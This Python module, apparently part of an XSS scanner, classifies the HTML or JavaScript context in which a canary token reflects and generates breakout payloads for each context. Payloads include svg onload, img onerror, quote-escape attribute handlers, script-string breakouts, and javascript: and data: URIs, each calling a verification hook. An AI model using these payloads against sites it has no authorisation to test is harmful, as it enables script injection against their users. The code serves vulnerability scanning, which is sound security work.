"""
DOM Reflection Analyzer & Context-Aware Payload Mutator.

When an injected probe or canary token reflects into the live DOM without executing,
inspects the exact HTML/JS syntax context and generates targeted breakout payloads
guaranteed to trigger the Zero-FP verification hook: window.__xoxss_verify(token).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import List, Optional, Tuple


class DomSyntaxContext(Enum):
    """HTML and JavaScript syntax contexts for DOM reflections."""
    HTML_BODY = "html_body"
    ATTR_DOUBLE_QUOTE = "attr_double_quote"
    ATTR_SINGLE_QUOTE = "attr_single_quote"
    ATTR_UNQUOTED = "attr_unquoted"
    SCRIPT_DOUBLE_QUOTE = "script_double_quote"
    SCRIPT_SINGLE_QUOTE = "script_single_quote"
    SCRIPT_TEMPLATE = "script_template"
    SCRIPT_TEMPLATE_LITERAL = "script_template"
    SCRIPT_BARE = "script_bare"
    URI_ATTR = "uri_attr"
    COMMENT = "comment"
    STYLE = "style"
    UNKNOWN = "unknown"


@dataclass
class ContextReflection:
    """Classified context of a reflected canary token."""
    context: DomSyntaxContext
    surrounding_html: str
    tag_name: str = ""
    attr_name: str = ""
    is_script: bool = False
    is_uri: bool = False
    canary: str = ""


class ContextMutator:
    """
    Analyzes live DOM reflections and mutates payloads tailored to breakout syntax.
    """

    def classify_dom_context(self, html: str, canary: str) -> DomSyntaxContext:
        """Convenience method returning the classified DomSyntaxContext enum directly."""
        return self.classify_reflection(html, canary).context

    def classify_reflection(self, html: str, canary: str) -> ContextReflection:
        """
        Inspect live HTML/DOM surrounding canary to classify its exact syntax context.
        """
        if not html or not canary or canary not in html:
            return ContextReflection(context=DomSyntaxContext.UNKNOWN, surrounding_html="", canary=canary)

        pos = html.find(canary)
        start = max(0, pos - 200)
        end = min(len(html), pos + len(canary) + 200)
        surrounding = html[start:end]
        prefix = html[start:pos]
        suffix = html[pos + len(canary):end]

        # 1. Inside HTML comment: <!-- ... CANARY ... -->
        last_comment_open = prefix.rfind("<!--")
        last_comment_close = prefix.rfind("-->")
        if last_comment_open > last_comment_close:
            return ContextReflection(
                context=DomSyntaxContext.COMMENT,
                surrounding_html=surrounding,
                canary=canary,
            )

        # 2. Inside <script> block
        last_script_open = prefix.lower().rfind("<script")
        last_script_close = prefix.lower().rfind("</script")
        if last_script_open > last_script_close:
            # Check JS quoting context
            sub_js = prefix[last_script_open:]
            dquotes = sub_js.count('"') - sub_js.count('\\"')
            squotes = sub_js.count("'") - sub_js.count("\\'")
            backticks = sub_js.count("`") - sub_js.count("\\`")

            if dquotes % 2 == 1:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_DOUBLE_QUOTE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )
            elif squotes % 2 == 1:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_SINGLE_QUOTE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )
            elif backticks % 2 == 1:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_TEMPLATE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )
            else:
                return ContextReflection(
                    context=DomSyntaxContext.SCRIPT_BARE,
                    surrounding_html=surrounding,
                    is_script=True,
                    canary=canary,
                )

        # 3. Inside an HTML tag attribute: <tag ... attr=CANARY ...>
        last_tag_open = prefix.rfind("<")
        last_tag_close = prefix.rfind(">")
        if last_tag_open > last_tag_close:
            # We are inside a tag's attributes
            tag_slice = prefix[last_tag_open:]
            tag_match = re.match(r"<([a-zA-Z0-9_-]+)", tag_slice)
            tag_name = tag_match.group(1).lower() if tag_match else ""

            # Check attribute name
            attr_match = re.search(r"([a-zA-Z0-9_:-]+)\s*=\s*(?:['\"]?)$", tag_slice)
            attr_name = attr_match.group(1).lower() if attr_match else ""
            is_uri = attr_name in ("href", "src", "action", "formaction", "data")

            # Check quoting
            if prefix.endswith('"'):
                ctx = DomSyntaxContext.URI_ATTR if is_uri else DomSyntaxContext.ATTR_DOUBLE_QUOTE
            elif prefix.endswith("'"):
                ctx = DomSyntaxContext.URI_ATTR if is_uri else DomSyntaxContext.ATTR_SINGLE_QUOTE
            else:
                ctx = DomSyntaxContext.URI_ATTR if is_uri else DomSyntaxContext.ATTR_UNQUOTED

            return ContextReflection(
                context=ctx,
                surrounding_html=surrounding,
                tag_name=tag_name,
                attr_name=attr_name,
                is_uri=is_uri,
                canary=canary,
            )

        # 4. Fallback: Normal HTML Tag Body
        return ContextReflection(
            context=DomSyntaxContext.HTML_BODY,
            surrounding_html=surrounding,
            canary=canary,
        )

    def generate_breakout_payloads(
        self,
        classified_or_html: ContextReflection | str,
        token: str,
        canary: str = "",
    ) -> List[str]:
        """
        Generate targeted breakout payloads tailored to the classified reflection context.
        Accepts either a ContextReflection object or (html, token, canary).
        """
        if isinstance(classified_or_html, str):
            classified = self.classify_reflection(classified_or_html, canary or token)
        else:
            classified = classified_or_html

        verify_call = f"window.__xoxss_verify('{token}')"
        ctx = classified.context

        if ctx == DomSyntaxContext.HTML_BODY:
            return [
                f"<svg/onload={verify_call}>",
                f"<img src=x onerror={verify_call}>",
                f"<script>{verify_call}</script>",
                f"<details open ontoggle={verify_call}>",
                f"<iframe srcdoc='<script>{verify_call}</script>'></iframe>",
            ]

        elif ctx == DomSyntaxContext.ATTR_DOUBLE_QUOTE:
            return [
                f'" autofocus onfocus="{verify_call}" x="',
                f'" onmouseover="{verify_call}" x="',
                f'"><svg/onload={verify_call}>',
                f'"><script>{verify_call}</script>',
                f'" style="animation-name:x" onanimationstart="{verify_call}" x="',
            ]

        elif ctx == DomSyntaxContext.ATTR_SINGLE_QUOTE:
            return [
                f"' autofocus onfocus='{verify_call}' x='",
                f"' onmouseover='{verify_call}' x='",
                f"'><svg/onload={verify_call}>",
                f"'><script>{verify_call}</script>",
                f"' style='animation-name:x' onanimationstart='{verify_call}' x='",
            ]

        elif ctx == DomSyntaxContext.ATTR_UNQUOTED:
            return [
                f" autofocus onfocus={verify_call}",
                f" onmouseover={verify_call}",
                f"><svg/onload={verify_call}>",
                f"><script>{verify_call}</script>",
            ]

        elif ctx == DomSyntaxContext.SCRIPT_DOUBLE_QUOTE:
            return [
                f'"-{verify_call}-"',
                f'";{verify_call};//',
                f'";{verify_call};"',
                f'</script><svg/onload={verify_call}>',
                f'</script><script>{verify_call}</script>',
            ]

        elif ctx == DomSyntaxContext.SCRIPT_SINGLE_QUOTE:
            return [
                f"'-{verify_call}-'",
                f"';{verify_call};//",
                f"';{verify_call};'",
                f'</script><svg/onload={verify_call}>',
                f'</script><script>{verify_call}</script>',
            ]

        elif ctx == DomSyntaxContext.SCRIPT_TEMPLATE:
            return [
                f"${{{verify_call}}}",
                f"`-{verify_call}-`",
                f"</script><svg/onload={verify_call}>",
            ]

        elif ctx == DomSyntaxContext.SCRIPT_BARE:
            return [
                f";{verify_call};//",
                f"({verify_call})",
                f"{verify_call}",
            ]

        elif ctx == DomSyntaxContext.URI_ATTR:
            return [
                f"javascript:{verify_call}",
                f"javascript:void({verify_call})",
                f"data:text/html,<script>{verify_call}</script>",
                f'" autofocus onfocus="{verify_call}" x="',
                f'"><svg/onload={verify_call}>',
            ]

        elif ctx == DomSyntaxContext.COMMENT:
            return [
                f"--> <svg/onload={verify_call}>",
                f"--><script>{verify_call}</script>",
            ]

        # Generic polyglot fallbacks
        return [
            f"<svg/onload={verify_call}>",
            f'"><svg/onload={verify_call}>',
            f"'-{verify_call}-'",
            f"javascript:{verify_call}",
        ]

